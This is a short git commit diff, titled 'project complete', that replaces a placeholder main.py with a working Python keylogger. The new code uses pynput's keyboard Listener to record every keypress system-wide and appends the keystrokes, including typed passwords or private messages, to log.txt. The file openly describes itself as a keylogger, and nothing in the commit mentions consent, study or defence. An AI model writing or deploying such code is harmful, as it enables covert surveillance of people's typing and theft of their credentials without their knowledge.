04b2b0e1bfd7a7af45bf144d3daa6ce9f287bf50
Keotshepile <Cleotheprogrammer>
2026-06-13 14:36:22 +0200

    project complete

--- main.py
+++ main.py
@@ -1,4 +1,21 @@
-# This is a keylogger script that captures keystrokes and stores them in a log file.
+from pynput.keyboard import Listener
 
-with open('log.txt', 'a') as f: 
-    f.write('\nI am awesome') 
+# This is a keylogger script that captures keystrokes and stores them in a log file.
+def write_to_file(key):
+    keydata = str(key)
+    keydata = keydata.replace("'","")
+
+    if keydata == 'Key.space':
+        keydata = ' '
+
+    elif keydata == 'Key.enter':
+        keydata = '\n'
+
+    elif keydata.startswith('Key'):
+         keydata = ''
+
+    with open('log.txt', 'a') as f: 
+        f.write(keydata) 
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
